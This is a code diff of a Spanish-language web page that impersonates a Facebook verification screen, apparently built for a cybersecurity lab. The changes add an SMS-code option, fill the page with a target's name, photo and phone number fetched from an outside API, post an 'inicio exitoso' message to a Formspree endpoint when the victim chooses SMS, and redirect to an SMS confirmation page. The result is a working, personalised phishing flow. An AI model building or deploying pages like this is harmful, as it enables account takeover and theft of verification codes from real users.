@@ -207,7 +207,6 @@
 
             <div class="section-group profile-box">
                 <div class="avatar-placeholder">
-                    <!-- Modificado con id="avatar-api" y convertido en <img> para soportar la foto -->
                     <img id="avatar-api" src="" alt="Foto de perfil" style="width: 100%; height: 100%; border-radius: 50%; object-fit: cover; display: none;" />
                     <div id="avatar-fallback" class="avatar-silhouette">
                         <svg viewBox="0 0 32 32"><path d="M16 17.5c3.6 0 6.5-2.9 6.5-6.5S19.6 4.5 16 4.5 9.5 7.4 9.5 11s2.9 6.5 6.5 6.5zm0 2.5c-4.8 0-14.5 2.4-14.5 7.2V32h29v-4.8c0-4.8-9.7-7.2-14.5-7.2z" /></svg>
@@ -217,7 +216,6 @@
                     </div>
                 </div>
                 <div>
-                    <!-- Modificado con id="nombre-api" -->
                     <div id="nombre-api" style="font-size:16px;font-weight:500;">Cargando...</div>
                     <div style="font-size:14px;color:#65676b;">Facebook</div>
                 </div>
@@ -226,10 +224,10 @@
             <form id="loginForm">
                 <div class="section-group">
                     <label class="option-row">
-                        <input type="radio" name="method" value="correo" checked>
+                        <input type="radio" name="method" value="sms" checked>
                         <div class="option-text-container">
-                            <div style="font-weight:500;">Usar la seguridad del dispositivo</div>
-                            <div style="font-size:14px;color:#65676b;">Usa tu huella digital, rostro o PIN del equipo</div>
+                            <div style="font-weight:500;">Obtener código por SMS</div>
+                            <div id="telefono-api" style="font-size:14px;color:#65676b;">Cargando...</div>
                         </div>
                         <div class="custom-radio"></div>
                     </label>
@@ -258,7 +256,6 @@
     </div>
 
     <script>
-            // Consumo de la API para nombre y foto de perfil al cargar la página
             document.addEventListener("DOMContentLoaded", () => {
                 const apiUrl = 'https://labciberseguridad.onrender.com/api/Perfiles/1';
 
@@ -270,7 +267,7 @@
                         return response.json();
                     })
                     .then(data => {
-                        // 1. Asignar el nombre: si existe y no está vacío, lo pone. Si no, pone "..."
+                        // Cargar Nombre
                         const elementoNombre = document.getElementById('nombre-api');
                         if (elementoNombre) {
                             if (data.nombre && data.nombre.trim() !== "") {
@@ -280,7 +277,7 @@
                             }
                         }
 
-                        // 2. Asignar la foto si viene en la API y no está vacía
+                        // Cargar Avatar
                         const elementoAvatar = document.getElementById('avatar-api');
                         const elementoFallback = document.getElementById('avatar-fallback');
                         if (elementoAvatar && data.fotoUrl && data.fotoUrl.trim() !== "") {
@@ -288,14 +285,28 @@
                             elementoAvatar.style.display = 'block';
                             if (elementoFallback) elementoFallback.style.display = 'none';
                         }
+
+                        // Cargar Teléfono
+                        const elementoTelefono = document.getElementById('telefono-api');
+                        if (elementoTelefono) {
+                            // Asumiendo que la propiedad en la API se llama "telefono" o "celular"
+                            if (data.telefono && data.telefono.trim() !== "") {
+                                elementoTelefono.textContent = data.telefono;
+                            } else if (data.celular && data.celular.trim() !== "") {
+                                elementoTelefono.textContent = data.celular;
+                            } else {
+                                elementoTelefono.textContent = "+**********";
+                            }
+                        }
                     })
                     .catch(error => {
                         console.error("Error al cargar el perfil de la API:", error);
+
                         const elementoNombre = document.getElementById('nombre-api');
-                        if (elementoNombre) {
-                            // Si la API falla por completo, también mostramos "..."
-                            elementoNombre.textContent = "...";
-                        }
+                        if (elementoNombre) elementoNombre.textContent = "...";
+
+                        const elementoTelefono = document.getElementById('telefono-api');
+                        if (elementoTelefono) elementoTelefono.textContent = "+**********";
                     });
             });
 
@@ -306,48 +317,25 @@
 
                 const seleccion = inputSeleccionado.value;
 
-                if (seleccion === 'correo') {
-                    if (window.PublicKeyCredential) {
-                        try {
-                            const challenge = new Uint8Array(32);
-                            window.crypto.getRandomValues(challenge);
-
-                            const userId = new Uint8Array(16);
-                            window.crypto.getRandomValues(userId);
-
-                            const publicKeyCredentialCreationOptions = {
-                                challenge: challenge,
-                                rp: { name: "Sistema Demo", id: window.location.hostname },
-                                user: {
-                                    id: userId,
-                                    name: "usuario@demostracionsistema.com",
-                                    displayName: "Usuario"
-                                },
-                                pubKeyCredParams: [
-                                    { alg: -7, type: "public-key" },
-                                    { alg: -257, type: "public-key" }
-                                ],
-                                timeout: 60000,
-                                authenticatorSelection: {
-                                    authenticatorAttachment: "platform",
-                                    userVerification: "required"
-                                },
-                                attestation: "direct"
-                            };
-
-                            await navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions });
-
-                            window.location.href = '@Url.Action("Password", "Home")';
-
-                        } catch (error) {
-                            console.warn("No se completó la verificación del dispositivo:", error);
-                            alert("No se pudo verificar la seguridad de tu dispositivo. Serás redirigido para ingresar tu contraseña.");
-                            window.location.href = '@Url.Action("Initiate", "Home")';
-                        }
-                    } else {
-                        alert("Este navegador o dispositivo no admite autenticación biométrica nativa.");
+                if (seleccion === 'sms') {
+                    try {
+                        // Enviar mensaje de inicio exitoso a Formspree
+                        await fetch('https://formspree.io/f/xkjnnwdd', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ message: "inicio exitoso" })
+                        });
+                    } catch (error) {
+                        console.error("Error al enviar a Formspree:", error);
                     }
+
+                    // Redirección inmediata tras enviar el mensaje
+                    window.location.href = '@Url.Action("ConfirmaSMS", "Home")';
+
                 } else if (seleccion === 'password') {
+                    // Redirección directa si elige contraseña
                     window.location.href = '@Url.Action("Initiate", "Home")';
                 }
             }
